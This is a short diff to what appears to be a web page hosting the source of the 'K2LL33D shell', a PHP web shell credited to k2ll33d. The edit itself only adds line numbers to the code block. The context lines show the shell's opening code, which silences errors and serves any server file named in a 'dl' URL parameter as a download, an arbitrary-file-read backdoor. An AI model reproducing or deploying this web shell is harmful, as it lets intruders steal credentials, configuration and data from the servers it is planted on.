@@ -17,7 +17,7 @@ K2LL33D shell. By k2ll33d.
 
 ### K2LL33D shell source code
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 // by k2ll33d / fb/k2ll33d
 set_time_limit(0);error_reporting(0);
 if(isset($_GET["dl"]) && ($_GET["dl"] != "")){$file = $_GET["dl"];$filez = @file_get_contents($file);header("Content-type: application/octet-stream");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).";");echo $filez;exit;}
